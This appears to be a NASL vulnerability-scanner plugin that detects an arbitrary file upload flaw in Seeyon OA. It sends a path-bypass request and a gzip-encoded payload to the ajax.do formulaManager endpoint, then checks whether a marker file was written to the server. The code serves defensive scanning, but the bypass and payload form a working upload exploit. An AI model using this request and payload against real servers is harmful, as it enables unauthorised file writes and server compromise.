include("compat.inc");


if (description)
{
  script_id(51799299);
  script_version("1.3");
  script_name(english:"Seeyon OA any file upload");
  script_summary(english:"Seeyon OA any file upload");
  script_set_attribute(attribute:"description", value:"Seeyon OA any file upload.");
  script_set_attribute(attribute:"solution", value:"Seeyon OA any file upload");
  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"risk_factor", value:"High");
  script_set_attribute(attribute:"in_the_news", value:"true");
  script_end_attributes();
  script_family(english:"Web Servers");
  script_dependencies("find_service.nasl", "http_version.nasl");
  script_category(ACT_ATTACK);
  script_copyright(english:"This script is Copyright (C) WebRAY, Inc.");
  script_require_ports("Services/www");
}



include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("openvas-https2.inc");

port = get_kb_item("Services/www");
soc = open_sock_tcp(port);
data = "managerMethod=validate&arguments=%1F%C2%8B%08%00%0D%15%00%60%00%C3%BFm%C2%91%5FO%C3%820%14%C3%85%C3%9F%C3%B9%14%C3%8D%5E6%22%C2%96P%C3%94%C2%A8%C3%84%07%17%C3%A1%C3%91%18%C3%BE%0E%C2%8D1e%C3%9C%C3%89%C2%B4%C3%ABjo%27%23%C2%84%C3%AFNGG%C3%90%C2%84%C2%BD%C3%9C%C3%9E%C3%9Bs%C3%8E%7E%C3%9B%7D%C3%9B%C3%BAI%C2%AE%C2%B3B%C3%B0%C3%B1F%C2%81%7FO%3A%2Dr%C2%9C%3C%C3%B3%C2%AC%C2%9A%C3%B8%06%C3%90%C3%B8%C2%A7q%C2%BFT%1A%10%C3%93%5CV%C2%97%23%C2%A3S%C3%B9I%147%2B%C3%B2%40%3CJ%C3%9BkXp%C2%A5%C2%B0%C2%8D%00%C2%9B%5C%C2%B6%C2%BD%5E%C2%83%C3%98%C3%A7%C2%8B%C3%BFr%C2%9A%C3%A6%C3%B4%C3%85%C3%8A%C3%8DL%C2%A7%064Q%C2%A73%C2%B3f%09%C3%ABs%C2%B2%C2%A0%C3%8A%C2%BE%C3%B00%C3%A6R%C2%82%C3%BE0%C2%99%C2%A2%C2%A64%5E%C3%93%C3%A5%C3%96%C3%AF%C3%87%15%08Q%01L%C3%98T%C3%80%C3%AC%C2%AE%13%C2%B1%C3%81%C3%8F%3CZ%C2%85%C3%B3%C3%AEP%2D%C3%98u2%C2%8DB%5C%C2%B0%C3%81w%C3%94%19%C2%8A%C2%B8%3BL%C3%86%C2%ACT%C2%AFl%C2%AAj%3C%2C%24%C3%8DR%C2%8Ci%C3%B88%C3%AA%C3%9F%5C%3DA%C2%9C%2F%2D%C3%A1%C2%B2%C2%AE%0E%C3%AE%C2%BC%28%C3%B8O%C3%A2%2Cu%C3%A3%7C%C2%AE%09%C3%AA0%C3%AAjX%24%C2%895%1F%C3%80%C2%9B%2Do2%1E%5C%C3%9E%1E%3F%C3%AA%C3%AF%C2%8F%C2%A1%C2%87F%C3%88%C3%9A%C3%AE%C2%B2%C3%8E%C3%A9b%C2%91%23X%C2%98%5D%C2%AFZ%C2%98%3D%2C%21%21h%C2%B8IcR%C2%96e%C3%90%C3%9C%C3%BA%3B%C2%BBE%C2%BB%C3%89mU%C2%8D%2E%C3%80%7Fo%C3%AC%01UH%C2%A0%2B%01%02%00%00";
if (!soc)
{
  audit(AUDIT_SOCK_FAIL, port, appname);
}
if (get_kb_list("SSL/Transport/"+port)){
	res = http_get(item:"/seeyon/thirdpartyController.do.css/..;/ajax.do", port:port);
	ssl_res = https_req_get(request:res, port:port);
	if("java.lang.NullPointerException:null" >< ssl_res){
		var req =
			'POST /seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip HTTP/1.1\r\n' +
			'Host: ' + get_host_ip() + ":" +port+ '\r\n' +
			'User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0' + '\r\n' +
			'Accept-Encoding: gzip, deflate' + '\r\n' +
			'Content-Type: application/x-www-form-urlencoded' + '\r\n' +
			'Connection: keep-alive'+ '\r\n' +
			'Accept: */*' + '\r\n' + 
			'Content-Length: ' + strlen(data) + '\r\n' + 
			'\r\n'+
			data;
		ssl_reqs = https_req_get(request:req, port:port);
		if('"message":null' >< ssl_reqs && "HTTP/1.1 500" >< ssl_reqs){
			resp = http_get(item:"/seeyon/scanner_tmp.txt", port:port);
			ssl_resp = https_req_get(request:resp, port:port);
			if("Seeyou_ajaxAction_Upload_Test_Oligei" >< ssl_resp){
				security_hole(port:port, data:ssl_reqs);
			}
		}	
	}
	
}else{
	res = http_send_recv3(method: "GET", port: port, item: "/seeyon/thirdpartyController.do.css/..;/ajax.do", add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
	if("200" >< res[0] && "java.lang.NullPointerException:null" >< res[2]){
		req = http_send_recv3(method: "POST", data:data, port: port, item: "/seeyon/autoinstall.do.css/..;/ajax.do?method=ajaxAction&managerName=formulaManager&requestCompress=gzip", add_headers: make_array("Accept-Encoding", "gzip, deflate","Content-Type","application/x-www-form-urlencoded"));
		if("500" >< req[0] && '"message":null' >< req[2]){
			banner = http_send_recv3(method: "GET", port: port, item: "/seeyon/scanner_tmp.txt", add_headers: make_array("Content-Type","application/x-www-form-urlencoded"));
			if("200" >< banner[0] && "Seeyou_ajaxAction_Upload_Test_Oligei" >< banner[2]){
				security_hole(port:port, extra:banner[2]);
			}
		}
	}
}
close(soc);
